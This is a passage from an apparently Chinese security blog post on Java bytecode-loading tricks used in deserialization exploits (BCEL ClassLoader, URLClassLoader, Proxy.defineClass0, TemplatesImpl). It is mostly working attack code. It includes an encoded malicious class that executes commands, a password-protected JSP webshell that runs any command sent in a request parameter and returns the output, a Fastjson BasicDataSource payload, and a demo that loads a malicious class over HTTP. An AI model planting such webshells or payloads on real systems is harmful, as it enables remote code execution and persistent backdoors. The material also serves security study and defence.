class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(ByteCodeEvil.class.getName());</span><br><span class="line">      <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(clazz.toBytecode(),<span class="literal">true</span>);</span><br><span class="line">      System.out.println(code);</span><br></pre></td></tr></table></figure><p>如图，将会获得<code>Becl</code>字节码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312093020.png"></p><p>动态调试<code>loadClass</code>发现，会判断加载的字节码是否以<code>$$BCEL$$</code>开头</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>则编写测试类，继续以0x01中的恶意类为基础，可以实现命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Becl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bcelCode</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(bcelCode);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，也可以将输入输出替换为内置对象，做一个jsp马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pwd.equals(PASSWORD)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">bcelCode</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (ClassLoader) c.newInstance();</span><br><span class="line">    Class&lt;?&gt; clazz = loader.loadClass(bcelCode);</span><br><span class="line">    java.lang.reflect.Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">    <span class="comment">// 回显</span></span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    response.getWriter().print(obj.toString());</span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Fastjson的BasicDataSource利用"><a href="#Fastjson的BasicDataSource利用" class="headerlink" title="Fastjson的BasicDataSource利用"></a>Fastjson的<code>BasicDataSource</code>利用</h3><p>在BasicDataSource利用链中，主要就是利用了BCEL加载字节码。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-URLClassLoader"><a href="#0x03-URLClassLoader" class="headerlink" title="0x03 URLClassLoader"></a>0x03 URLClassLoader</h2><p>URLClassLoader可以加载任意路径下的类</p><p>有点类似于<code>RMI</code>和<code>LDAP</code>下的远程加载恶意类的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;ByteCodeEvil&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        constructor.newInstance(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将0x01中的恶意类的<code>java</code>文件，放置在文件夹中，(将包名除去)，重新编译为<code>class</code>文件，然后使用python开一个<code>HTTP</code>服务</p><p>同理，使用内置对象替换，也可以作为<code>jsp</code>马 (这里4ra1n师傅将恶意类打包成jar包了)</p><h2 id="0x04-defineClass0"><a href="#0x04-defineClass0" class="headerlink" title="0x04 defineClass0"></a>0x04 defineClass0</h2><p>这里的<code>defineClass0</code>，是基于<code>Proxy</code>的<strong>native</strong>方法，使用到的<code>Proxy</code>类是Java动态代理的底层实现类。也许可以绕过一些防御。</p><p>在<code>java.lang.reflect.Proxy</code>中有这么一个方法，里面没有定义任何方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass0(ClassLoader loader, String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.proxy_define0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Define0_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; defineByProxy(String className, <span class="type">byte</span>[] classBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取系统的类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="comment">// 反射java.lang.reflect.Proxy类获取其中的defineClass0方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Proxy.class.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>,ClassLoader.class, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// 修改方法的访问权限</span></span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 反射调用java.lang.reflect.Proxy.defineClass0()方法</span></span><br><span class="line">        <span class="comment">// 动态向JVM注册对象</span></span><br><span class="line">        <span class="comment">// 返回一个 Class 对象</span></span><br><span class="line">        <span class="keyword">return</span> (Class&lt;?&gt;) method.invoke(<span class="literal">null</span>, classLoader, className, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxjb20vQnl0ZUNvZGVFdmlsOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcALgEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBBDABCAEMMAEQARQcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAEGNvbS9CeXRlQ29kZUV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7ACEAEAARAAAAAQAAABIAEwAAAAIAAQAUABUAAgAWAAAA0gAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAADABcAAAAeAAcAAAAJAAQACwAMAAwAJQAOAC8ADwA+ABEARgASABgAAAA0AAUAAABHABkAGgAAAAAARwAbABMAAQAMADsAHAAdAAIAJQAiAB4AHwADACwAGwAgABMABAAhAAAAGwAC/wAlAAQHACIHACMHACQHACUAAPwAGAcAIwAmAAAABAABACcAAQAoACkAAQAWAAAALwABAAEAAAAFKrQAD7AAAAACABcAAAAGAAEAAAAXABgAAAAMAAEAAAAFABkAGgAAAAEAKgAAAAIAKw==&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; testClass = defineByProxy(<span class="string">&quot;com.ByteCodeEvil&quot;</span>, bytes);</span><br><span class="line">        Constructor&lt;?&gt; constructor = testClass.getConstructor(String.class);</span><br><span class="line">        constructor.newInstance(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-TemplateImpl"><a href="#0x05-TemplateImpl" class="headerlink" title="0x05 TemplateImpl"></a>0x05 TemplateImpl</h2><p>这个类用的比较多一些，例如CC链、Fastjson、7U21</p><p>开发者不会直接使用到 defineClass 方法，但是，Java 底层还是有一些类用到了它，如：<code>TemplatesImpl</code>。</p><p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类中定义了一个内部类 <code>TransletClassLoader</code> ，这个类里重写了 <code>defineClass</code> 方法，并且这里没有显式地声明其定义域。Java 中默认情况下，如果一个方法没有显式声明作用域，其作用域为 default。因此，这里被重写的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</p><p>其中<code>TransletClassLoader#defineClass()</code>可以如下追溯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">-&gt; TemplatesImpl#newTransformer()</span><br><span class="line">-&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">-&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>其中，前两个方法<code>TemplatesImpl#getOutputProperties()</code> 、 <code>TemplatesImpl#newTrans</code>，他们的作用域是<code>public</code>，可以尝试呗外部调用。尝试用 <code>newTransformer()</code> 构造一个简单的 POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tem_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span 